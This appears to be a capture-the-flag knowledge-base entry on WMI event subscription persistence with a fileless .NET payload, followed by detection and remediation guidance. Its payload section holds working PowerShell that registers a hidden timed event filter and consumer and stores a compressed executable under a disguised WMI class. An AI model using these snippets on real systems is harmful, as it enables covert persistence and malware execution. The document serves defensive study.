Vulnerability Chain — WMI Persistence + Fileless .NET Execution

Since this room chains multiple techniques into one attack, they belong together in a single vuln file.
markdown

# WMI Event Subscription Persistence with Embedded Fileless Payload

## Metadata
- **Title:** WMI Event Subscription Persistence with Embedded Fileless .NET Payload
- **Tags:** `wmi` `persistence` `fileless` `powershell` `dotnet` `windows` `base64` `deflate`
- **CWE:** CWE-912 (Hidden Functionality), CWE-506 (Embedded Malicious Code)
- **OWASP:** A06:2021 – Vulnerable and Outdated Components
- **Severity:** High (CVSS 7.8 – persistence, privilege escalation potential)

## Description
Attackers can establish stealthy, fileless persistence on Windows systems by abusing WMI Event Subscriptions. A malicious `__EventFilter` (triggering on time-based conditions), a `CommandLineEventConsumer` (executing hidden PowerShell), and a `__FilterToConsumerBinding` form a subscription that survives reboots. The payload is stored as Base64 + Deflate-compressed data inside a custom WMI class property, then loaded in-memory via `Reflection.Assembly.Load()` — bypassing traditional disk-based detection.

## Vulnerable Pattern
1. `__EventFilter` with a WQL query that triggers on common system events (e.g., time changes)
2. `CommandLineEventConsumer` executing `powershell.exe -Window Hidden -enc <base64>`
3. Custom WMI class (e.g., `Win32_HardwareTelemetry`) storing a compressed PE payload as a string property
4. `[Reflection.Assembly]::Load()` loading the decoded/decompressed bytes into memory and invoking `EntryPoint`

## Attack Payloads

### Payload 1 — WMI Subscription Creation (PowerShell)
``powershell
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "EngineTelemetryFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute = 30"
}

Payload 2 — Embedded Payload Storage
powershell

$compressedPayload = [Convert]::ToBase64String([IO.Compression.DeflateStream]::new(
    [IO.MemoryStream][IO.File]::ReadAllBytes("payload.exe"),
    [IO.Compression.CompressionMode]::Compress
))
Set-WmiInstance -Class Win32_HardwareTelemetry -Arguments @{ ConfigData = $compressedPayload }

Payload 3 — CommandLineEventConsumer
powershell

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "EngineTelemetryConsumer"
    CommandLineTemplate = "cmd /C powershell.exe -Sta -Nop -Window Hidden -enc <ENCODED_SCRIPT>"
}

Detection
WMI Repository Inspection
powershell

Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | Select Name, Query
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer | Select Name, CommandLineTemplate
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding

Windows Event Logs

    Security 4688: Process creation for powershell.exe with -Window Hidden -enc

    PowerShell Operational 4104: Script block logging capturing Base64-encoded commands and Reflection.Assembly::Load

    Security 4720: User account creation events (if payload creates backdoor accounts)

Sysmon (if configured)

    Event ID 19: WMI Event Filter registration

    Event ID 20: WMI Event Consumer registration

    Event ID 21: WMI Event Consumer to Filter binding

Remediation

    Remove the WMI subscription: Use Get-WmiObject to locate and Remove-WmiObject to delete the malicious __EventFilter, CommandLineEventConsumer, and __FilterToConsumerBinding

    Delete the custom WMI class: Remove-WmiObject -Class Win32_HardwareTelemetry

    Remove any backdoor accounts: Check for and delete unauthorized local users created by the payload

    Enable PowerShell logging: Configure Script Block Logging (Event 4104) and Module Logging via GPO

    Deploy Sysmon: With WMI event monitoring (IDs 19-21) for real-time detection of subscription creation

    Restrict WMI permissions: Limit root\subscription namespace access to SYSTEM and authorized administrators only

Rooms Seen

    After Hours (Hacker Holidays 2026 — The Byte Lotus Hotel)

Related

    MITRE ATT&CK: T1546.003 (Event Triggered Execution: Windows Management Instrumentation Event Subscription)

    MITRE ATT&CK: T1059.001 (Command and Scripting Interpreter: PowerShell)

    MITRE ATT&CK: T1027 (Obfuscated Files or Information)

    MITRE ATT&CK: T1620 (Reflective Code Loading)

    Microsoft Learn: WMI Repository Files (OBJECTS.DATA, INDEX.BTR)

